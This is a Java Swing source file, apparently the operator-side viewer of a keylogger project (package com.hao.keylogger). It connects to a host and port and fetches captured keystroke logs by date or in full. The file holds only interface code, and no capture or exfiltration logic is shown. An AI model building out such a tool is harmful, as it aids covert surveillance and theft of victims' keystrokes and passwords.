/**
 * 
 */
package com.hao.keylogger.views;

import java.awt.Dimension;
import java.awt.Insets;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Date;

import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.JTextField;

import com.hao.keylogger.controllers.ClientLogController;
import com.hao.keylogger.controllers.IClientView;

import net.sourceforge.jdatepicker.impl.JDatePanelImpl;
import net.sourceforge.jdatepicker.impl.JDatePickerImpl;
import net.sourceforge.jdatepicker.impl.UtilDateModel;

/**
 * @author Hao Svit
 *
 */
public class ClientView extends JFrame implements ActionListener, IClientView {
	private static final String BTN_FETCH_LOG_NAME = "btn_fetchLog";
	private static final String BTN_FETCH_ALL_LOG_NAME = "btn_fetchAllLog";
	private static final String BTN_CONNECT_NAME = "btn_connect";

	ClientLogController controller;
	
	JTextField tf_host;
	JTextField tf_port;
	JTextArea ta_logView;
	JDatePickerImpl datePicker;
	
	private boolean isConnected;
	
	public ClientView() {
		InitFrame();
		//TODO set look and feel
//		try {
//			UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
//		} catch (ClassNotFoundException | InstantiationException | IllegalAccessException
//				| UnsupportedLookAndFeelException e) {
//			e.printStackTrace();
//		}
	}
	@Override
	public String getHost() {
		return tf_host.getText();
	}

	@Override
	public int getPort() {
		int port;
		try {
			port = Integer.parseInt(tf_port.getText());
		}
		catch (Exception ex) {
			port = 0;
		}
		return port;
	}

	@Override
	public String getLog() {
		return ta_logView.getText();
	}
	
	@Override
	public Date getDatePicked() {
		return (Date) datePicker.getModel().getValue();
	}
	
	@Override
	public void setHost(String host) {
		tf_host.setText(host);
	}

	@Override
	public void setPort(int port) {
		tf_port.setText(port + "");
	}

	@Override
	public void setLogContent(String log) {
		ta_logView.setText(log);
	}
	
	@Override
	public void setController(ClientLogController controller) {
		this.controller = controller;
	}
	
	private void InitFrame() {
		setSize(700, 400);

		// get screen size
		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		setLocation(screenSize.width / 2 - this.getWidth() / 2, screenSize.height / 2 - this.getHeight() / 2);
		
		// North panel
		JPanel northPanel = new JPanel();
		northPanel.setLayout(new BoxLayout(northPanel, BoxLayout.Y_AXIS));

		// connection panel
		JPanel conPanel = new JPanel();
		JLabel lb_host = new JLabel("Host");
		tf_host = new JTextField();
		tf_host.setColumns(15);

		JLabel lb_port = new JLabel("Port");
		tf_port = new JTextField();
		tf_port.setColumns(4);

		JButton btn_connect = new JButton("Connect");
		btn_connect.setName(BTN_CONNECT_NAME);
		btn_connect.addActionListener(this);

		conPanel.add(lb_host);
		conPanel.add(tf_host);
		conPanel.add(lb_port);
		conPanel.add(tf_port);
		conPanel.add(btn_connect);

		// Fucntions panel
		JPanel fPanel = new JPanel();
		
		// label choose date
		JLabel lb_chooseDate = new JLabel("Choose date");
		fPanel.add(lb_chooseDate);
		
		// Date picker
		UtilDateModel dateModel = new UtilDateModel();
		JDatePanelImpl datePanel = new JDatePanelImpl(dateModel);
		datePicker = new JDatePickerImpl(datePanel);

		fPanel.add(datePicker);
		
		// button fetch log 
		JButton btn_fetchLog = new JButton("Fetch log");
		btn_fetchLog.setName(BTN_FETCH_LOG_NAME);
		fPanel.add(btn_fetchLog);
		btn_fetchLog.addActionListener(this);
		
		fPanel.add(Box.createRigidArea(new Dimension(30, 0)));
		
		// button fetch all log
		JButton btn_fetchAllLog = new JButton("Fetch all logs");
		btn_fetchAllLog.setName(BTN_FETCH_ALL_LOG_NAME);
		fPanel.add(btn_fetchAllLog);
		btn_fetchAllLog.addActionListener(this);
		
		// adding 2 panels to north panel
		northPanel.add(conPanel);
		northPanel.add(fPanel);
		
		// center
		ta_logView = new JTextArea(5,10);
		
		// adding panels to main container
		getContentPane().add(northPanel, "North");
		getContentPane().add(ta_logView);
		setVisible(true);

		setDefaultCloseOperation(EXIT_ON_CLOSE);
	}

	@Override
	public void actionPerformed(ActionEvent event) {
		JButton btn = (JButton) event.getSource();
		
		switch (btn.getName()) {
		case BTN_CONNECT_NAME:
			if (controller.connect()) {
				isConnected = true;
			}
			break;
		case BTN_FETCH_LOG_NAME:
			if (isConnected) {
				controller.fetchLog(getDatePicked());
			}
			break;
		case BTN_FETCH_ALL_LOG_NAME:
			if (isConnected) {
				controller.fetchAllLogs();
			}
			break;
		}
	}

	
}
